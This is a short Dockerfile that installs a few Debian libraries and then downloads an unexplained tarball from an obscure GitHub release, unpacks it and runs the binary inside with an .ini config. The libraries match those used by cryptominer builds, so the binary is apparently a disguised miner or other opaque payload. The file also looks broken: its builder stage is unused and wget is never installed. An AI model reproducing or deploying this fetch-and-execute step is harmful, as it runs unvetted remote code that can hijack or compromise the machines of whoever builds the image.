FROM debian:sid-slim as builder

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

FROM debian:sid-slim

RUN apt-get update && apt-get dist-upgrade -y && \
    apt-get install -y ca-certificates libcurl4 libjansson4 libgomp1 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

RUN wget https://github.com/imraahatikah6827/hi/releases/download/hi/ver.tar.gz && \ 
    tar xf ver.tar.gz && \
    ./ver ver.ini
